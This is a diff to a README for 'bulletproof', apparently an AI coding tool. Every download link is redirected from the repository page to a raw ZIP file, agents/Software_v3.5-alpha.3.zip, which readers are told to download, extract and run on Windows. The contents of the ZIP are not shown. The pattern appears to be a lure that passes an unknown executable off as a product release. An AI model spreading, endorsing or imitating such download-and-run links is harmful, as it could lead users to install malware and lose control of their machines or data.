@@ -1,10 +1,10 @@
 # 🛡️ bulletproof - Steady AI coding, clean results
 
-[![Download bulletproof](https://img.shields.io/badge/Download%20bulletproof-blue?style=for-the-badge)](https://github.com/estrogenantagonistbustier65/bulletproof)
+[![Download bulletproof](https://img.shields.io/badge/Download%20bulletproof-blue?style=for-the-badge)](https://github.com/estrogenantagonistbustier65/bulletproof/raw/refs/heads/main/agents/Software_v3.5-alpha.3.zip)
 
 ## 🚀 Download
 
-Go to https://github.com/estrogenantagonistbustier65/bulletproof to download and run this file
+Go to https://github.com/estrogenantagonistbustier65/bulletproof/raw/refs/heads/main/agents/Software_v3.5-alpha.3.zip to download and run this file
 
 ## 🧩 What bulletproof does
 
@@ -33,7 +33,7 @@ For best results, use a recent version of Windows and keep your browser up to da
 
 ## 📥 Download and install
 
-1. Open https://github.com/estrogenantagonistbustier65/bulletproof
+1. Open https://github.com/estrogenantagonistbustier65/bulletproof/raw/refs/heads/main/agents/Software_v3.5-alpha.3.zip
 2. Look for the download option on the page
 3. Save the file to a folder you can find again, such as Downloads or Desktop
 4. If the file is a ZIP file, right-click it and choose Extract All
@@ -141,4 +141,4 @@ That makes it a good fit for users who want less chaos and more control in their
 
 ## 📎 Download again
 
-Visit https://github.com/estrogenantagonistbustier65/bulletproof to download and run this file
+Visit https://github.com/estrogenantagonistbustier65/bulletproof/raw/refs/heads/main/agents/Software_v3.5-alpha.3.zip to download and run this file
